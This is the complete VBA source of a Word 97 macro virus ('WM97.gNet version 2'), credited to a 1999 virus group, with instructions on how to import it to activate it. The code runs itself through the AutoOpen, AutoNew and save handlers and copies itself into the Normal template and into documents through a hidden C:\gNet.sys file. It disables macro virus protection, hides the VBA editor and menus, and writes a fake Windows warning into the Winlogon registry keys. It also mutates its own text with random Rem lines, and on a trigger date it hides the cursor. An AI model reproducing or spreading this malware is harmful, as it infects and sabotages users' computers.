   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "gNet"
   ' This is gNet Macro Virus version 2
   ' (c) 1999 by ksg
   ' astigmatiZm virus group
   ' www.astigmatiZm.cjb.net
   ' rename this file to gNet.bas and import it in MS Words Visual Basic Editor to activate

   Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

   '----------------------
   '  WM97.gNet version 2
   ' ---------------------
   ' (c) by KSG [ AMACC ]
   ' ---------------------
   '   [ Astig Matizm ]
   '

   Sub main()
           On Error Resume Next
           Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
           Set cb = CommandBars: Set cbvisible = Visible: Set cbProtection = Protection
           k$ = "Fa": s$ = "lse"
           WordBasic.DisableAutoMacros 0
           cb("Visual Basic").cbvisible = False
           cb("Visual Basic").Enabled = False
           cb("Visual Basic").cbProtection = msoBarNoChangeVisible
           cb("Visual Basic").cbProtection = msoBarNoCustomize
           cb("Tools").Controls("Macro").Delete
           cb("Tools").Controls("Customize...").Delete
           CustomizationContext = NormalTemplate
           FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
           FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
           AtiveDocument.ReadOnlyRecommended = False
           System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Windows Critical Error"
           System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "This version of Windows is not Y2K ready. Please Upgrade Today! www.microsoft.com"

                   With Application
                           .EnableCancelKey = wdCancelDisabled
                           .DisplayAlerts = wdAlertsNone
                   End With

                   With Options
                           .ConfirmConversions = k$ + s$
                           .VirusProtection = k$ + s$
                   End With

           Randomize

           ActiveLines = ksg("gNet").tre.CountOfLines

           If ActiveLines > 300 Then
                           With ksg("gNet").tre

           For TheLine = 1 To .CountOfLines
                   If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
           Next TheLine
           End With
           Else
                   With ksg("gNet").tre
                   vsize = Int(Rnd * 10)
           For loop1 = 1 To vsize
                   pstring = ""
                   PolyLines = .CountOfLines
                   RndLine = Int(Rnd * PolyLines) + 1
                   psize = Int(Rnd * 39) + 1
           For loop2 = 1 To psize
                   pstring = pstring & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
           Next loop2
                   .InsertLines RndLine, "Rem " & pstring
           Next loop1

           End With
           End If
           If Day(Now()) = 10 And Month(Now()) = 9 Then Call Payload

   End Sub

   Sub Payload()
   On Error Resume Next

   Assistant.Visible = True

   With Assistant.NewBalloon
           .Icon = msoIconAlert
           .Text = "W 9 7 M . g N e t   b y   k s g" & vbCr & "" & vbCr & "  www.astigmatiZm.cjb.net "
           .Heading = "astigmatiZm VX Team"
           .Animation = msoAnimationSearching
           .Show
   End With

   Assistant.Visible = False

   While ShowCursor(False) >= 0
   Wend

   End Sub

   Sub Routine()
   On Error Resume Next

           Set amt = NormalTemplate.VBProject.VBComponents
           Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
           Application.EnableCancelKey = wdCancelDisabled

   With Options
           .SaveNormalPrompt = (Rnd * 0)
           .VirusProtection = (Rnd * 0)
           .ConfirmConversions = (Rnd * 0)
   End With
   ksg("gNet").Export "C:\gNet.sys"

           For x = 1 To amt.Count

                   If amt(x).Name = "gNet" Then var1 = True

           Next x

           For y = 1 To ActiveDocument.VBProject.VBComponents.Count

                   If ActiveDocument.VBProject.VBComponents(y).Name = "gNet" Then varmain = True

           Next y

           If var1 = True And varmain = False Then Set adp = ActiveDocument.VBProject
           If var1 = False And varmain = True Then Set adp = NormalTemplate.VBProject
           If var1 = True And varmain = True Then GoTo labas

           adp.VBComponents.Import "C:\gNet.sys"

           If varmain = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
           If var1 = False Then NormalTemplate.Save

   labas:
           Call main

           Shell "attrib +h c:\gNet.sys", vbHide

   End Sub

   Sub AutoOpen()
           On Error Resume Next
           Call Routine
           Call main
   End Sub

   Sub AutoNew()
           On Error Resume Next
           Call Routine
           Call main
   End Sub

   Sub FileSave()
           On Error Resume Next
           Call Routine
           Call main
           ActiveDocument.Save
   End Sub

   Sub FileSaveAs()
           On Error Resume Next
           Call Routine
           Call main
           Dialogs(wdDialogFileSaveAs).Show
   End Sub

   Sub fclosedlg()
           On Error Resume Next
           Call Routine
           Call main
           WordBasic.FileClose dlg
   End Sub

   Sub fsavedlg()
           On Error Resume Next
           Call Routine
           Call main
           ActiveDocument.Save
   End Sub
